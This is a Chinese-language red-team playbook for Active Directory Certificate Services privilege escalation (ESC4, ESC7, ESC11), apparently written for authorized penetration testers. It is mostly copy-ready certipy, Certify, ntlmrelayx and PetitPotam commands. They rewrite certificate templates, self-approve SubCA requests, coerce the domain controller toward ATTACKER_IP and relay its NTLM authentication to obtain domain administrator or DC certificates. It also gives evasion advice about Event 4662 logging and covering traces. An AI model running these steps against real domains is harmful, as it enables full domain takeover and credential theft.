# ADCS 模板 ACL 与高级攻击

## ESC4: 模板 ACL 滥用

### 概述

当低权限用户对证书模板 AD 对象拥有写权限时，可以修改模板配置使其满足 ESC1 条件，然后正常利用 ESC1 获取高权限证书。

### 漏洞条件

用户对模板对象拥有以下任一权限:

| ACL 权限 | 效果 |
|----------|------|
| GenericAll | 完全控制模板对象 |
| GenericWrite | 修改模板任意属性 |
| WriteDACL | 修改模板的 ACL（可给自己添加 FullControl） |
| WriteOwner | 修改模板所有者（成为 Owner 后拥有隐式 FullControl） |
| WriteProperty | 修改模板特定属性 |

### 步骤 1: 枚举模板 ACL

```bash
# certipy 枚举（自动标注 ESC4）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout

# 输出中查找:
# [!] Vulnerabilities
#   ESC4: 'DOMAIN\\user' has write permissions
#   Template Name: VulnerableTemplate
#   ...
#   Write Owner Principals: DOMAIN\user
#   Write Dacl Principals: DOMAIN\user
```

```powershell
# Windows: Certify 枚举
Certify.exe find /vulnerable

# 输出中查找:
# Permissions
#   Object Control Permissions
#     WriteOwner Principals: DOMAIN\user
#     WriteDacl Principals: DOMAIN\user
```

### 步骤 2: 备份原始模板配置

```bash
# certipy 修改时自动保存备份
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template VulnerableTemplate -save-old

# 输出: VulnerableTemplate.json（原始配置备份）
```

### 步骤 3: 修改模板为 ESC1 条件

```bash
# 使用 certipy 一键修改（设置 ESC1 所需的全部条件）
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template VulnerableTemplate -save-old

# 此命令自动执行:
# 1. 设置 msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT
# 2. 添加 Client Authentication EKU
# 3. 确保当前用户有 Enroll 权限
# 4. 将原始配置保存到 JSON 文件
```

修改后的关键属性变化:

| 属性 | 修改前 | 修改后 |
|------|--------|--------|
| `msPKI-Certificate-Name-Flag` | 原始值 | 包含 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` |
| `pkiExtendedKeyUsage` | 原始 EKU | 包含 `Client Authentication (1.3.6.1.5.5.7.3.2)` |
| Enrollment 权限 | 原始权限 | 当前用户可 Enroll |

### 步骤 4: 利用修改后的模板（按 ESC1 流程）

```bash
# 申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template VulnerableTemplate \
  -upn administrator@DOMAIN

# 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### 步骤 5: 恢复原始模板配置（清理）

```bash
# 使用保存的 JSON 恢复
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template VulnerableTemplate \
  -configuration VulnerableTemplate.json

# 验证恢复成功
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout | grep -A 20 "VulnerableTemplate"
```

> **操作安全**: 必须在利用完成后恢复模板配置。模板修改会产生 Event 4662 日志，长时间保持修改状态增加被发现的风险。

---

## ESC7: CA 管理员权限滥用

### 概述

用户拥有 CA 对象上的 `ManageCA` 或 `ManageCertificates` 权限时，可以操控 CA 的行为来获取高权限证书。

### ManageCA 权限利用

`ManageCA` 允许修改 CA 配置，可以启用 SubCA 模板或修改 CA 标志:

```bash
# 启用 SubCA 模板（如果未启用）
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -enable-template SubCA

# 申请 SubCA 证书（通常会被拒绝 - 这是预期行为）
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template SubCA \
  -upn administrator@DOMAIN
# 记录 Request ID（例如: Request ID is 42）
```

### ManageCertificates 权限利用

`ManageCertificates` 允许批准或拒绝待处理的证书请求:

```bash
# 用 ManageCertificates 权限批准被拒绝的请求
certipy ca -u MANAGER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -issue-request 42

# 下载已批准的证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -retrieve 42

# 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### 组合攻击: ManageCA + ManageCertificates

当同一用户同时拥有两个权限时:

```bash
# 1. 将自己添加为 CA Officer（利用 ManageCA）
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -add-officer USER

# 2. 启用 SubCA 模板
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -enable-template SubCA

# 3. 申请证书（会被挂起）
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template SubCA -upn administrator@DOMAIN
# Request ID: 42

# 4. 自己批准自己的请求
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -issue-request 42

# 5. 下载证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -retrieve 42

# 6. 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC11: RPC 注册无加密中继

### 概述

ESC11 类似 ESC8，但目标是 ADCS 的 RPC 注册接口（ICPR）而非 HTTP Web Enrollment。当 CA 未强制 RPC 数据包签名时可被利用。

### 漏洞条件

- CA 安装了证书注册服务
- RPC 接口未强制数据包签名（`IF_ENFORCEENCRYPTICERTREQUEST` 未设置）
- 有触发 NTLM 认证的方法

### 检查 RPC 签名配置

```bash
# 远程注册表查询（需要管理权限）
netexec smb CA_SERVER -u USER -p PASS \
  -x 'reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME" /v InterfaceFlags'

# InterfaceFlags = 0x28 → 未强制加密 → 可利用
# InterfaceFlags = 0x68 → 强制加密 → 不可利用
```

### 利用步骤

```bash
# 1. 启动 ntlmrelayx（目标为 RPC 端点）
ntlmrelayx.py -t "rpc://CA_SERVER" -rpc-mode icpr \
  -smb2support --adcs --template DomainController

# 2. 触发域控 NTLM 认证
python3 PetitPotam.py ATTACKER_IP DC_IP

# 3. ntlmrelayx 输出 Base64 证书
# 保存并认证（同 ESC8 后续步骤）
echo "MIIRd..." | base64 -d > dc.pfx
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

### ESC8 vs ESC11 对比

| 特性 | ESC8 (HTTP) | ESC11 (RPC) |
|------|-------------|-------------|
| 目标端口 | 80/443 (HTTP/HTTPS) | 135 + 动态端口 (RPC) |
| 目标路径 | `/certsrv/certfnsh.asp` | ICPR RPC 接口 |
| 防御标志 | EPA (Extended Protection) | `IF_ENFORCEENCRYPTICERTREQUEST` |
| 工具参数 | `-t http://CA/certsrv/certfnsh.asp` | `-t rpc://CA -rpc-mode icpr` |
| 适用场景 | Web Enrollment 已安装 | Web Enrollment 未安装但 RPC 可达 |

---

## 模板枚举脚本与工具

### certipy 全面枚举

```bash
# 枚举所有信息（输出 JSON + TXT）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP

# 仅列出已启用的模板
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -enabled

# 仅列出有漏洞的模板
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable

# 详细输出到终端
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout

# 使用 Hash 认证
certipy find -u USER@DOMAIN -hashes :NTLM_HASH -dc-ip DC_IP -vulnerable
```

### Certify (Windows)

```powershell
# 枚举所有 CA
Certify.exe cas

# 枚举所有模板
Certify.exe find

# 查找易受攻击的模板
Certify.exe find /vulnerable

# 指定 CA 枚举
Certify.exe find /ca:CA_SERVER\CA-NAME

# 查找当前用户可注册的模板
Certify.exe find /enrolleeSuppliesSubject
```

### LDAP 手动枚举

```bash
# 查询所有证书模板
ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" \
  cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage nTSecurityDescriptor

# 查询 CA 服务器
ldapsearch -H ldap://DC_IP -D "USER@DOMAIN" -w PASS \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKIEnrollmentService)" \
  cn dNSHostName certificateTemplates
```

### 枚举输出关键字段速查

| 字段 | 含义 | ESC 关联 |
|------|------|----------|
| `ENROLLEE_SUPPLIES_SUBJECT` | 申请者可指定 SAN | ESC1 |
| `Any Purpose` EKU | 证书用于任意目的 | ESC2 |
| `Certificate Request Agent` EKU | 可代理申请 | ESC3 |
| Write 权限 (GenericAll/WriteDACL 等) | 可修改模板 | ESC4 |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA 全局 SAN | ESC6 |
| `ManageCA` / `ManageCertificates` | CA 管理权限 | ESC7 |
| HTTP `/certsrv/` 可达 | Web Enrollment | ESC8 |
| `CT_FLAG_NO_SECURITY_EXTENSION` | 无安全扩展 | ESC9 |
| RPC 注册无加密 | ICPR 中继 | ESC11 |

---

## 模板修改后恢复 (Cleanup)

### 为什么必须恢复

- 模板修改会产生 AD 对象变更事件（Event 4662）
- 修改后的模板对所有有 Enroll 权限的用户开放 ESC1
- 蓝队可以通过定期扫描发现异常模板配置

### 恢复流程

```bash
# 方法 1: 使用 certipy 保存的 JSON 恢复
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template VulnerableTemplate \
  -configuration VulnerableTemplate.json

# 方法 2: 手动 LDAP 修改（如果没有 JSON 备份）
python3 -c "
import ldap3
server = ldap3.Server('DC_IP', get_info=ldap3.ALL)
conn = ldap3.Connection(server, 'USER@DOMAIN', 'PASS', auto_bind=True)
conn.modify(
    'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com',
    {
        'msPKI-Certificate-Name-Flag': [(ldap3.MODIFY_REPLACE, [0])],
    }
)
print(conn.result)
"
```

### 验证恢复

```bash
# 确认模板不再标记为 ESC1/ESC4
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout | grep -A 5 "VulnerableTemplate"

# 确认 ENROLLEE_SUPPLIES_SUBJECT 已移除
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -stdout | grep -B 2 -A 10 "VulnerableTemplate"
# 不应出现 "Enrollee Supplies Subject: True"
```

### 清理检查清单

- [ ] 恢复模板 `msPKI-Certificate-Name-Flag` 原始值
- [ ] 恢复模板 `pkiExtendedKeyUsage` 原始 EKU
- [ ] 恢复模板 ACL（如果修改过权限）
- [ ] 确认 certipy find 不再报告该模板为 vulnerable
- [ ] 记录攻击时间窗口用于报告
